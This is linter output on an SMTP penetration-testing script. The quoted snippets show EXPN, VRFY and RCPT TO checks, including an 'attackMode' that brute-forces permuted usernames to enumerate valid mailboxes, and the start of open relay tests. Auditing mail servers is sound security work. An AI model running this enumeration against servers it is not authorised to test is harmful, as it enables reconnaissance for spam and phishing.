2614 |                 "%Y%m%d",
2615 |                 "%Y%d%m",
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\networks\smtpAudit.py:2634:50
     |
2632 | ΓÇª                         t = datetime.datetime(yr, j, k)
2633 | ΓÇª                         selectors.append(t.strftime(f))
2634 | ΓÇª                         selectors.append("%d" % (time.mktime(t.timetuple())))
     |                                            ^^^^
2635 | ΓÇª                     except:
2636 | ΓÇª                         pass
     |
help: Replace with format specifiers

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2635:29
     |
2633 | ΓÇª                         selectors.append(t.strftime(f))
2634 | ΓÇª                         selectors.append("%d" % (time.mktime(t.timetuple())))
2635 | ΓÇª                     except:
     |                       ^^^^^^
2636 | ΓÇª                         pass
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2638:13
     |
2636 |                                 pass
2637 |
2638 |         dbg("Generated: {} selectors to review.".format(len(selectors)))
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2639 |         return selectors
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2675:30
     |
2673 |                     txt = txt.to_text().replace('"', "")
2674 |                     if txt.lower().startswith("v=dmarc"):
2675 |                         info('Found DMARC record: "{}"'.format(txt))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2676 |                         ret = self.processDmarc(txt)
2677 |                         records.append(txt)
     |
help: Convert to f-string

UP015 [*] Unnecessary mode argument
    --> security\penetration-testing-tools\networks\smtpAudit.py:2758:47
     |
2756 |         try:
2757 |             if self.userNamesList:
2758 |                 with open(self.userNamesList, "r") as f:
     |                                               ^^^
2759 |                     for l in f.readlines():
2760 |                         users.append(l.strip())
     |
help: Remove mode argument

E741 Ambiguous variable name: `l`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2759:25
     |
2757 |             if self.userNamesList:
2758 |                 with open(self.userNamesList, "r") as f:
2759 |                     for l in f.readlines():
     |                         ^
2760 |                         users.append(l.strip())
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2762:18
     |
2760 |                         users.append(l.strip())
2761 |
2762 |             info("Read {} lines from users list.".format(len(users)), toOutLine=True)
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2763 |             return users
     |
help: Convert to f-string

UP024 [*] Replace aliased errors with `OSError`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2765:16
     |
2763 |             return users
2764 |
2765 |         except IOError:
     |                ^^^^^^^
2766 |             err("Could not open user names list file.", toOutLine=True)
2767 |             sys.exit(-1)
     |
help: Replace `IOError` with builtin `OSError`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2771:26
     |
2769 |         # Set 2: Common words permutations
2770 |         for w in words:
2771 |             users.append("{}".format(w))
     |                          ^^^^^^^^^^^^^^
2772 |
2773 |             for i in range(0, 11):
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2774:30
     |
2773 |             for i in range(0, 11):
2774 |                 users.append("{}{}".format(w, i))
     |                              ^^^^^^^^^^^^^^^^^^^
2775 |                 users.append("{}{:02d}".format(w, i))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2775:30
     |
2773 |             for i in range(0, 11):
2774 |                 users.append("{}{}".format(w, i))
2775 |                 users.append("{}{:02d}".format(w, i))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^
2776 |
2777 |         dbg("Generated list of {} user names to test.".format(len(users)))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2777:13
     |
2775 |                 users.append("{}{:02d}".format(w, i))
2776 |
2777 |         dbg("Generated list of {} user names to test.".format(len(users)))
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2778 |
2779 |         return users
     |
help: Convert to f-string

N803 Argument name `attackMode` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2785:24
     |
2783 |     # EXPN TESTS
2784 |     #
2785 |     def expnTest(self, attackMode=False):
     |                        ^^^^^^^^^^^^^^^^
2786 |         i = 0
2787 |         maxFailures = 64
     |

N806 Variable `maxFailures` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2787:9
     |
2785 |     def expnTest(self, attackMode=False):
2786 |         i = 0
2787 |         maxFailures = 64
     |         ^^^^^^^^^^^
2788 |         failures = 0
     |

N806 Variable `secureConfigurationCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2790:9
     |
2788 |         failures = 0
2789 |
2790 |         secureConfigurationCodes = (252, 500, 502)
     |         ^^^^^^^^^^^^^^^^^^^^^^^^
2791 |         unsecureConfigurationCodes = (250, 251, 550, 551, 553)
     |

N806 Variable `unsecureConfigurationCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2791:9
     |
2790 |         secureConfigurationCodes = (252, 500, 502)
2791 |         unsecureConfigurationCodes = (250, 251, 550, 551, 553)
     |         ^^^^^^^^^^^^^^^^^^^^^^^^^^
2792 |
2793 |         userNamesList = set(self.generateUserNamesList(permute=attackMode))
     |

N806 Variable `userNamesList` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2793:9
     |
2791 |         unsecureConfigurationCodes = (250, 251, 550, 551, 553)
2792 |
2793 |         userNamesList = set(self.generateUserNamesList(permute=attackMode))
     |         ^^^^^^^^^^^^^
2794 |         foundUserNames = set()
     |

N806 Variable `foundUserNames` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2794:9
     |
2793 |         userNamesList = set(self.generateUserNamesList(permute=attackMode))
2794 |         foundUserNames = set()
     |         ^^^^^^^^^^^^^^
2795 |
2796 |         info("Attempting EXPN test, be patient - it may take a longer while...")
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2811:36
     |
2809 |                     return None
2810 |
2811 |                 out = self.sendcmd("EXPN {}".format(user))
     |                                    ^^^^^^^^^^^^^^^^^^^^^^
2812 |
2813 |                 if out[0] in secureConfigurationCodes or (
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2817:26
     |
2815 |                 ):
2816 |                     ok("SECURE: EXPN could not be used for user enumeration.")
2817 |                     _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2818 |                     if not attackMode:
2819 |                         return True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2826:29
     |
2824 |                     if not attackMode:
2825 |                         fail(
2826 |                             'UNSECURE: "EXPN {}": allows user enumeration!'.format(user)
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2827 |                         )
2828 |                         _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2828:30
     |
2826 |                             'UNSECURE: "EXPN {}": allows user enumeration!'.format(user)
2827 |                         )
2828 |                         _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2829 |                         return False
2830 |                     else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2832:29
     |
2830 |                       else:
2831 |                           ok(
2832 | /                             "Found new user: {}@{}".format(
2833 | |                                 rcptTo, self.getMailDomain()
2834 | |                             ),
     | |_____________________________^
2835 |                               toOutLine=True,
2836 |                           )
     |
help: Convert to f-string

F821 Undefined name `rcptTo`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2833:33
     |
2831 |                         ok(
2832 |                             "Found new user: {}@{}".format(
2833 |                                 rcptTo, self.getMailDomain()
     |                                 ^^^^^^
2834 |                             ),
2835 |                             toOutLine=True,
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2837:30
     |
2835 |                             toOutLine=True,
2836 |                         )
2837 |                         _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2838 |                         foundUserNames.add(rcptTo)
     |
help: Convert to f-string

F821 Undefined name `rcptTo`
    --> security\penetration-testing-tools\networks\smtpAudit.py:2838:44
     |
2836 |                         )
2837 |                         _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
2838 |                         foundUserNames.add(rcptTo)
     |                                            ^^^^^^
2839 |
2840 |                 elif (out[0] == False and out[1] == False) or not out[1]:
     |

E712 Avoid equality comparisons to `False`; use `not out[0]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:2840:23
     |
2838 |                         foundUserNames.add(rcptTo)
2839 |
2840 |                 elif (out[0] == False and out[1] == False) or not out[1]:
     |                       ^^^^^^^^^^^^^^^
2841 |                     info(
2842 |                         "UNKNOWN: During EXPN test the server disconnected. This might be secure."
     |
help: Replace with `not out[0]`

E712 Avoid equality comparisons to `False`; use `not out[1]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:2840:43
     |
2838 |                         foundUserNames.add(rcptTo)
2839 |
2840 |                 elif (out[0] == False and out[1] == False) or not out[1]:
     |                                           ^^^^^^^^^^^^^^^
2841 |                     info(
2842 |                         "UNKNOWN: During EXPN test the server disconnected. This might be secure."
     |
help: Replace with `not out[1]`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2850:25
     |
2849 |                 else:
2850 |                     dbg("Other return code: {}".format(out[0]))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2851 |                     failures += 1
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2863:17
     |
2861 |           else:
2862 |               ok(
2863 | /                 "EXPN Attack finished. Found: {} / {}".format(
2864 | |                     len(foundUserNames), len(userNamesList)
2865 | |                 ),
     | |_________________^
2866 |                   toOutLine=True,
2867 |               )
     |
help: Convert to f-string

N803 Argument name `attackMode` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2874:27
     |
2872 |     # RCPT TO TESTS
2873 |     #
2874 |     def rcptToTests(self, attackMode=False):
     |                           ^^^^^^^^^^^^^^^^
2875 |         i = 0
2876 |         maxFailures = 256
     |

N806 Variable `maxFailures` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2876:9
     |
2874 |     def rcptToTests(self, attackMode=False):
2875 |         i = 0
2876 |         maxFailures = 256
     |         ^^^^^^^^^^^
2877 |         failures = 0
     |

N806 Variable `unsecureConfigurationCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2879:9
     |
2877 |         failures = 0
2878 |
2879 |         unsecureConfigurationCodes = (250,)
     |         ^^^^^^^^^^^^^^^^^^^^^^^^^^
2880 |         secureConfigurationCodes = (530, 553, 550)
     |

N806 Variable `secureConfigurationCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2880:9
     |
2879 |         unsecureConfigurationCodes = (250,)
2880 |         secureConfigurationCodes = (530, 553, 550)
     |         ^^^^^^^^^^^^^^^^^^^^^^^^
2881 |
2882 |         userNamesList = set(self.generateUserNamesList(permute=attackMode))
     |

N806 Variable `userNamesList` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2882:9
     |
2880 |         secureConfigurationCodes = (530, 553, 550)
2881 |
2882 |         userNamesList = set(self.generateUserNamesList(permute=attackMode))
     |         ^^^^^^^^^^^^^
2883 |         foundUserNames = set()
     |

N806 Variable `foundUserNames` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2883:9
     |
2882 |         userNamesList = set(self.generateUserNamesList(permute=attackMode))
2883 |         foundUserNames = set()
     |         ^^^^^^^^^^^^^^
2884 |
2885 |         info("Attempting RCPT TO test, be patient - it takes a longer while...")
     |

N806 Variable `mailFrom` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2887:13
     |
2885 |         info("Attempting RCPT TO test, be patient - it takes a longer while...")
2886 |
2887 |         for mailFrom in userNamesList:
     |             ^^^^^^^^
2888 |             if not attackMode and failures >= maxFailures:
2889 |                 err("FAILED: RCPT TO test failed too many times.")
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2900:17
     |
2899 |             out = self.sendcmd(
2900 |                 "MAIL FROM: <{}@{}>".format(mailFrom, self.getMailDomain())
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2901 |             )
2902 |             dbg("MAIL FROM returned: ({})".format(out))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2902:17
     |
2900 |                 "MAIL FROM: <{}@{}>".format(mailFrom, self.getMailDomain())
2901 |             )
2902 |             dbg("MAIL FROM returned: ({})".format(out))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2903 |
2904 |             if out and out[0] in (250,):
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2912:22
     |
2910 |                     "SECURE: SMTP server requires prior authentication when using RCPT TO."
2911 |                 )
2912 |                 _out('\tReturned: ("{}")'.format(out[1].decode()))
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2913 |                 if not attackMode:
2914 |                     return True
     |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not out[0]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:2934:19
     |
2932 |                 continue
2933 |
2934 |             elif (out[0] == False and out[1] == False) or not out[1]:
     |                   ^^^^^^^^^^^^^^^
2935 |                 info(
2936 |                     "UNKNOWN: During RCPT TO the server has disconnected. This might be secure."
     |
help: Replace with `not out[0]`

E712 Avoid equality comparisons to `False`; use `not out[1]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:2934:39
     |
2932 |                 continue
2933 |
2934 |             elif (out[0] == False and out[1] == False) or not out[1]:
     |                                       ^^^^^^^^^^^^^^^
2935 |                 info(
2936 |                     "UNKNOWN: During RCPT TO the server has disconnected. This might be secure."
     |
help: Replace with `not out[1]`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2944:21
     |
2943 |             else:
2944 |                 dbg("Server returned unexpected response in RCPT TO: {}".format(out))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2945 |                 failures += 1
2946 |                 continue
     |
help: Convert to f-string

N806 Variable `rcptTo` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:2952:21
     |
2951 |             try:
2952 |                 for rcptTo in userNamesList:
     |                     ^^^^^^
2953 |                     if mailFrom == rcptTo:
2954 |                         continue
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2960:33
     |
2958 |                           if i % (len(userNamesList) / 10) == 0 and i > 0:
2959 |                               info(
2960 | /                                 "RCPT TO test progress: {:02.2f}% - {:04} / {:04}".format(
2961 | |                                     perc, i, len(userNamesList)
2962 | |                                 ),
     | |_________________________________^
2963 |                                   toOutLine=True,
2964 |                               )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2981:25
     |
2980 |                     out = self.sendcmd(
2981 |                         "RCPT TO: <{}@{}>".format(rcptTo, self.getMailDomain())
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2982 |                     )
2983 |                     dbg("RCTP TO returned: ({})".format(out))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2983:25
     |
2981 |                         "RCPT TO: <{}@{}>".format(rcptTo, self.getMailDomain())
2982 |                     )
2983 |                     dbg("RCTP TO returned: ({})".format(out))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2984 |
2985 |                     if out and out[0] in unsecureConfigurationCodes:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2988:33
     |
2986 |                           if not attackMode:
2987 |                               fail(
2988 | /                                 'UNSECURE: "RCPT TO" potentially allows user enumeration: ({}, {})'.format(
2989 | |                                     out[0], out[1].decode()
2990 | |                                 )
     | |_________________________________^
2991 |                               )
2992 |                               return False
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:2995:33
     |
2993 |                           elif rcptTo not in foundUserNames:
2994 |                               ok(
2995 | /                                 "Found new user: {}@{}".format(
2996 | |                                     rcptTo, self.getMailDomain()
2997 | |                                 ),
     | |_________________________________^
2998 |                                   toOutLine=True,
2999 |                               )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3000:34
     |
2998 | ΓÇª                         toOutLine=True,
2999 | ΓÇª                     )
3000 | ΓÇª                     _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3001 | ΓÇª                     foundUserNames.add(rcptTo)
     |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\networks\smtpAudit.py:3004:25
     |
3003 |                       elif out and out[0] in secureConfigurationCodes:
3004 | /                         if SmtpTester.ifMessageLike(
3005 | |                             out, (550,), ("user", "unknown", "recipient", "rejected"), 2
3006 | |                         ):
3007 | |                             if not attackMode:
     | |______________________________________________^
3008 |                                   info(
3009 |                                       "Warning: RCPT TO may be possible: {} ({})".format(
     |
help: Combine `if` statements using `and`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3009:37
     |
3007 |   ΓÇª                     if not attackMode:
3008 |   ΓÇª                         info(
3009 | / ΓÇª                             "Warning: RCPT TO may be possible: {} ({})".format(
3010 | | ΓÇª                                 out[0], out[1].decode()
3011 | | ΓÇª                             )
     | |_______________________________^
3012 |   ΓÇª                         )
     |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not out[0]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3025:27
     |
3023 |                         #    else: return list(foundUserNames)
3024 |
3025 |                     elif (out[0] == False and out[1] == False) or not out[1]:
     |                           ^^^^^^^^^^^^^^^
3026 |                         info(
3027 |                             "UNKNOWN: During RCPT TO test the server has disconnected. This might be secure."
     |
help: Replace with `not out[0]`

E712 Avoid equality comparisons to `False`; use `not out[1]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3025:47
     |
3023 |                         #    else: return list(foundUserNames)
3024 |
3025 |                     elif (out[0] == False and out[1] == False) or not out[1]:
     |                                               ^^^^^^^^^^^^^^^
3026 |                         info(
3027 |                             "UNKNOWN: During RCPT TO test the server has disconnected. This might be secure."
     |
help: Replace with `not out[1]`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3035:29
     |
3034 |                     else:
3035 |                         dbg("Other return code: {}".format(out[0]))
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3036 |                         failures += 1
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3052:17
     |
3050 |           else:
3051 |               ok(
3052 | /                 "RCPT TO Attack finished. Found: {} / {}".format(
3053 | |                     len(foundUserNames), len(userNamesList)
3054 | |                 ),
     | |_________________^
3055 |                   toOutLine=True,
3056 |               )
     |
help: Convert to f-string

N803 Argument name `attackMode` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3063:24
     |
3061 |     # VRFY TESTS
3062 |     #
3063 |     def vrfyTest(self, attackMode=False):
     |                        ^^^^^^^^^^^^^^^^
3064 |         i = 0
3065 |         maxFailures = 64
     |

N806 Variable `maxFailures` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3065:9
     |
3063 |     def vrfyTest(self, attackMode=False):
3064 |         i = 0
3065 |         maxFailures = 64
     |         ^^^^^^^^^^^
3066 |         failures = 0
     |

N806 Variable `unsecureConfigurationCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3068:9
     |
3066 |         failures = 0
3067 |
3068 |         unsecureConfigurationCodes = (250, 251, 550, 551, 553)
     |         ^^^^^^^^^^^^^^^^^^^^^^^^^^
3069 |         secureConfigurationCodes = (252, 500, 502, 535)
     |

N806 Variable `secureConfigurationCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3069:9
     |
3068 |         unsecureConfigurationCodes = (250, 251, 550, 551, 553)
3069 |         secureConfigurationCodes = (252, 500, 502, 535)
     |         ^^^^^^^^^^^^^^^^^^^^^^^^
3070 |
3071 |         userNamesList = set(self.generateUserNamesList(permute=attackMode))
     |

N806 Variable `userNamesList` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3071:9
     |
3069 |         secureConfigurationCodes = (252, 500, 502, 535)
3070 |
3071 |         userNamesList = set(self.generateUserNamesList(permute=attackMode))
     |         ^^^^^^^^^^^^^
3072 |         foundUserNames = set()
     |

N806 Variable `foundUserNames` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3072:9
     |
3071 |         userNamesList = set(self.generateUserNamesList(permute=attackMode))
3072 |         foundUserNames = set()
     |         ^^^^^^^^^^^^^^
3073 |
3074 |         info("Attempting VRFY test, be patient - it may take a longer while...")
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3089:36
     |
3087 |                     return None
3088 |
3089 |                 out = self.sendcmd("VRFY {}".format(user))
     |                                    ^^^^^^^^^^^^^^^^^^^^^^
3090 |
3091 |                 if out[0] in secureConfigurationCodes or (
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3097:24
     |
3095 |                     if out[0] == 535:
3096 |                         comm = "unauthenticated "
3097 |                     ok("SECURE: VRFY disallows {}user enumeration.".format(comm))
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3098 |                     _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3098:26
     |
3096 |                         comm = "unauthenticated "
3097 |                     ok("SECURE: VRFY disallows {}user enumeration.".format(comm))
3098 |                     _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3099 |
3100 |                     if not attackMode:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3108:29
     |
3106 |                     if not attackMode:
3107 |                         fail(
3108 |                             'UNSECURE: "VRFY {}": allows user enumeration!'.format(user)
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3109 |                         )
3110 |                         _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3110:30
     |
3108 |                             'UNSECURE: "VRFY {}": allows user enumeration!'.format(user)
3109 |                         )
3110 |                         _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3111 |                         return False
3112 |                     else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3114:29
     |
3112 |                       else:
3113 |                           ok(
3114 | /                             "Found new user: {}@{}".format(
3115 | |                                 rcptTo, self.getMailDomain()
3116 | |                             ),
     | |_____________________________^
3117 |                               toOutLine=True,
3118 |                           )
     |
help: Convert to f-string

F821 Undefined name `rcptTo`
    --> security\penetration-testing-tools\networks\smtpAudit.py:3115:33
     |
3113 |                         ok(
3114 |                             "Found new user: {}@{}".format(
3115 |                                 rcptTo, self.getMailDomain()
     |                                 ^^^^^^
3116 |                             ),
3117 |                             toOutLine=True,
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3119:30
     |
3117 |                             toOutLine=True,
3118 |                         )
3119 |                         _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3120 |                         foundUserNames.add(rcptTo)
     |
help: Convert to f-string

F821 Undefined name `rcptTo`
    --> security\penetration-testing-tools\networks\smtpAudit.py:3120:44
     |
3118 |                         )
3119 |                         _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
3120 |                         foundUserNames.add(rcptTo)
     |                                            ^^^^^^
3121 |
3122 |                 elif (out[0] == False and out[1] == False) or not out[1]:
     |

E712 Avoid equality comparisons to `False`; use `not out[0]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3122:23
     |
3120 |                         foundUserNames.add(rcptTo)
3121 |
3122 |                 elif (out[0] == False and out[1] == False) or not out[1]:
     |                       ^^^^^^^^^^^^^^^
3123 |                     info(
3124 |                         "UNKNOWN: During VRFY test the server has disconnected. This might be secure."
     |
help: Replace with `not out[0]`

E712 Avoid equality comparisons to `False`; use `not out[1]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3122:43
     |
3120 |                         foundUserNames.add(rcptTo)
3121 |
3122 |                 elif (out[0] == False and out[1] == False) or not out[1]:
     |                                           ^^^^^^^^^^^^^^^
3123 |                     info(
3124 |                         "UNKNOWN: During VRFY test the server has disconnected. This might be secure."
     |
help: Replace with `not out[1]`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3132:25
     |
3131 |                 else:
3132 |                     dbg("Other return code: {}".format(out[0]))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3133 |                     failures += 1
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3145:17
     |
3143 |           else:
3144 |               ok(
3145 | /                 "VRFY Attack finished. Found: {} / {}".format(
3146 | |                     len(foundUserNames), len(userNamesList)
3147 | |                 ),
     | |_________________^
3148 |                   toOutLine=True,
3149 |               )
     |
help: Convert to f-string

N806 Variable `internalDomain` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3160:13
     |
3158 |             results = {}
3159 |
3160 |             internalDomain = self.getMailDomain()
     |             ^^^^^^^^^^^^^^
3161 |             externalDomain = config["smtp_external_domain"]
     |

N806 Variable `externalDomain` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3161:13
     |
3160 |             internalDomain = self.getMailDomain()
3161 |             externalDomain = config["smtp_external_domain"]
     |             ^^^^^^^^^^^^^^
3162 |
3163 |             ip = "[{}]".format(self.resolvedIPAddress)
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3163:18
     |
3161 |             externalDomain = config["smtp_external_domain"]
3162 |
3163 |             ip = "[{}]".format(self.resolvedIPAddress)
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3164 |             if not self.resolvedIPAddress:
3165 |                 ip = "[{}]".format(self.originalHostname)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3165:22
     |
3163 |             ip = "[{}]".format(self.resolvedIPAddress)
3164 |             if not self.resolvedIPAddress:
3165 |                 ip = "[{}]".format(self.originalHostname)
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3166 |
3167 |             srvname = self.localHostname
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3174:17
     |
3173 |   ΓÇª     dbg(
3174 | / ΓÇª         "Attempting open relay tests. Using following parameters:\n\tinternalDomain = {}\n\texternalDomain = {}\n\tdomain = {}\n\tΓÇª
3175 | | ΓÇª             internalDomain, externalDomain, domain, srvname, ip
3176 | | ΓÇª         )
     | |___________^
3177 |   ΓÇª     )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3190:46
     |
